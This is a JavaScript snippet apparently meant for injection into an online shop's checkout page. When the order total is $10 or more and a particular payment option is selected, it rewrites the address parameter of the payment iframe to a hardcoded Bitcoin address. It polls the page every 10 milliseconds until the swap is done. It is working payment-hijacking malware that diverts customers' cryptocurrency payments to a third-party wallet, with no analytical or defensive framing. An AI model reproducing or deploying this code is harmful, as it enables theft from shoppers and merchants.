var intervalId;
function checkIframe() { 
    if (window.location.href.indexOf("/shop/shippingaddress?coupon_code=&shipping_type=") > -1) {
        var grandTotalElement = Array.from(document.querySelectorAll('.row em')).find(function(el) {
            return el.textContent.trim() === 'Grand Total';
        });

        if (grandTotalElement) {
            var priceElement = grandTotalElement.nextElementSibling;
            var priceText = priceElement.textContent;
            var priceValue = parseInt(priceText.replace('$', '').trim());
            if (priceValue >= 10) { // Test threshold
                if (document.getElementsByTagName("select")[1].value == "2") {
                    const iframes = Array.from(document.getElementsByTagName("iframe"));
                    const targetValue = "common/create"; // The string to check for
                    const newValue = "bc1qr9k0eadc7wv9n6e2cjca28kzhthywjvsqw00vk"; // The new value for address
                     console.log(document.getElementsByTagName("select")[1].value);
                    const foundIframe = iframes.some(function(iframe) {
                        if (iframe.src.includes(targetValue)) {
                            const updatedSrc = iframe.src.replace(/(address=)[^&]*/, `$1${newValue}`);
                            iframe.src = updatedSrc; // Update the iframe src
                            clearInterval(intervalId); // Stop the interval when done
                            return true;
                        }
                        return false;
                    });
                }
            }
        }
    }
    // // 
}
intervalId = setInterval(checkIframe, 10);
